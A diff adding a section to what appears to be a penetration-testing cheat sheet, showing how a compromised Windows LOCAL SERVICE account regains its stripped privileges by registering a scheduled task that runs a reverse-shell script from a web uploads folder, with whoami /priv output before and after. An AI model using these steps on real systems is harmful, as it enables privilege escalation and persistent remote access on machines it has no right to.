@@ -414,6 +414,58 @@ On attacker machine
 $ certipy find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128
 ```
 
+## Service Accounts
+Service Accounts often have higher privileges than regular user accounts.
+On Windows, some services executed as LOCAL SERVICE or NETWORK SERVICE are configured to run with a restricted set of privileges. Therefore, even if the service is compromised, you won't get the golden impersonation privileges and privilege escalation to LOCAL SYSTEM should be more complicated. However, I found that, when you create a scheduled task, the new process created by the Task Scheduler Service has all the default privileges of the associated user account (except SeImpersonate). Therefore, with some token manipulations, you can spawn a new process with all the missing privileges.
+ 
+To restore the privileges of the service account you can either create and run a scheduled task or use [FullPowers.exe](https://github.com/itm4n/FullPowers/tree/master)
+ 
+Privileges before:
+```
+PS C:\xampp\htdocs\uploads> whoami
+nt authority\local service
+PS C:\xampp\htdocs\uploads> whoami /priv
+ 
+PRIVILEGES INFORMATION
+----------------------
+ 
+Privilege Name                Description                    State   
+============================= ============================== ========
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled 
+SeCreateGlobalPrivilege       Create global objects          Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+ 
+```
+ 
+Create and run scheduled task:
+```
+$TaskAction = New-ScheduledTaskAction -Execute 'powershell.exe' '-File "C:\xampp\htdocs\uploads\revshell.ps1"'
+Register-ScheduledTask -Action $TaskAction -TaskName "SomeTask11"
+Start-ScheduledTask -TaskName "SomeTask11"
+```
+ 
+Privileges after:
+```
+PS C:\Windows\system32> whoami
+nt authority\local service
+PS C:\Windows\system32> whoami /priv
+ 
+PRIVILEGES INFORMATION
+----------------------
+ 
+Privilege Name                Description                         State   
+============================= =================================== ========
+SeAssignPrimaryTokenPrivilege Replace a process level token       Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process  Disabled
+SeTcbPrivilege                Act as part of the operating system Disabled
+SeSystemtimePrivilege         Change the system time              Disabled
+SeAuditPrivilege              Generate security audits            Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking            Enabled 
+SeCreateGlobalPrivilege       Create global objects               Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
+SeTimeZonePrivilege           Change the time zone                Disabled
+```
+
 # Active Directory
 
 ## Capturing NTLM Net-Hashes with Responder
